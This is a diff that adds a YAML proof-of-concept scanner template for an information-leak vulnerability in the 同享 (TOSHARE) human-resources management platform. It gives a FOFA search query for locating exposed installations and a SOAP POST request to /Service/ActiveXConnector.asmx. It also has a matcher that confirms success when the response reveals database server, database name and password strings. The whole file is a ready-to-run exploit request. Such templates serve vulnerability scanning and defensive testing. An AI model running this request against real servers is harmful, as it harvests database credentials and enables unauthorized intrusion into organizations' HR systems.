@@ -1,0 +1,40 @@
+id: poc-yaml-tosharesoft-activexconnector-info-leak
+info:
+  name: 同享人力管理管理平台ActiveXConnector.asmx信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 同享人力资源管理系统
+  fofa: body="/Assistant/Default.aspx"
+requests:
+- method: POST
+  path: /Service/ActiveXConnector.asmx
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+    xmlns:tem="http://tempuri.org/">
+
+    <soapenv:Header/>
+
+    <soapenv:Body>
+
+    <tem:GetActivexConnector/>
+
+    </soapenv:Body>
+
+    </soapenv:Envelope>
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"server=") &&
+
+    contains(body,"database=") &&
+
+    contains(body,"password=") &&
+
+    contains(body,"<?xml version")
+
+    '
+variables: {}
+transport: http
